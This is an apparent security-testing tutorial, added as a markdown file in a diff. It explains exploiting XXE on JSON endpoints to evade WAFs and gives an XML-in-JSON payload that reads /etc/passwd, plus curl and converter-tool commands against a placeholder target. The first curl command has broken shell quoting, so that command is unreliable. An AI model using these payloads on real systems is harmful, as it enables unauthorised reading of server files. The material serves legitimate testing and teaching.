@@ -1,0 +1,81 @@
+---
+title: 'Exploiting XXE on JSON Endpoints: Bypass Techniques'
+description: Learn to exploit XXE vulnerabilities on JSON endpoints using XML-in-JSON
+  payloads to bypass WAF protections.
+keywords:
+- XXE
+- JSON endpoints
+- WAF bypass
+- XML parsing
+- security testing
+- JSON-to-XML conversion
+- vulnerabilities
+- cybersecurity
+---
+
+# XXE on JSON Endpoints
+
+## Context
+
+The goal of this article is to demonstrate how to exploit XML External Entity (XXE) vulnerabilities on endpoints that expect JSON payloads. Through the use of XML-in-JSON payloads and taking advantage of potential web application firewall (WAF) oversight, attackers can trigger XXE vulnerabilities even on JSON endpoints. This article assumes knowledge of XML parsing, JSON structure, Content-Type headers, and the basics of XML External Entity exploitation.
+
+## Theory
+
+### JSON Endpoints and XML Parsing Risks
+
+JSON endpoints are typically API routes designed to receive data in JSON format. However, some backend systems may convert incoming JSON data into XML for further processing. This practice can introduce risks if the conversion is not conducted securely. A common pitfall is when the backend inadvertently becomes vulnerable to XXE attacks. Most WAFs are configured to detect and block attacks utilizing XML payloads, but they often overlook JSON payloads—providing a potential bypass opportunity for attackers.
+
+### JSON-to-XML Conversion and XXE Injection
+
+Converters that transform JSON into XML are common in applications. If these converters are misconfigured or improperly implemented, they could inadvertently introduce vulnerabilities. An attacker can craft a JSON payload such that when it is converted to XML, an external entity reference is included. This can allow the attacker to perform XXE attacks, exploiting the server to access local files or internal network resources. The primary defense of WAF rules is generally focused on circumventing XML signatures, not nested XML within JSON, thus allowing attackers to evade these rules.
+
+### Error Patterns and Detection
+
+Understanding the error patterns caused by incorrect XML parsing can be crucial for detecting vulnerable endpoints. For example, SAX parse errors may occur if a payload is improperly handled or if the XML parsing logic reveals unintentional behaviors. Monitoring error messages or noting any timing differences in response times can further confirm underlying XML processing in these JSON endpoints.
+
+## Practice
+
+### Manual XXE via JSON-to-XML Conversion
+
+- Craft a JSON payload that, when converted, creates an XML structure vulnerable to XXE. The aim is to feed an XML parsing process an external entity.
+    
+    **Payload:**
+
+    ```json
+    {
+        "user": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
+    }
+    ```
+
+- Send the crafted JSON payload to the target endpoint using a `curl` command.
+
+    ```bash
+    curl -X POST https://target/api/endpoint -H 'Content-Type: application/json' -d '{"user":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"}'
+    ```
+
+- Analyze the response. Look for signs of successful XXE exploitation such as leaked file contents or XML parsing errors, like SAX errors.
+
+### Automated XXE Testing with NetSPI XXE-JSON Converter
+
+- Utilize NetSPI's XXE-JSON-Converter tool to automate the creation of JSON payloads designed to trigger XXE.
+
+    **Command:**
+
+    ```bash
+    xxe-json-converter -p 'file:///etc/passwd' -k user
+    ```
+
+- Use `curl` to send the generated JSON payload to the target endpoint.
+
+    ```bash
+    curl -X POST https://target/api/endpoint -H 'Content-Type: application/json' -d @payload.json
+    ```
+
+- Review the response to determine if file contents have been accessed or if there are XML parsing error messages.
+
+## Tools
+
+- **xxe-json-converter**
+- **curl** 
+
+By following this guide, a security professional can attempt to exploit XXE vulnerabilities in JSON endpoints, ensuring a deeper understanding of how JSON-to-XML conversion might be utilized by attackers to bypass defenses such as web application firewalls.
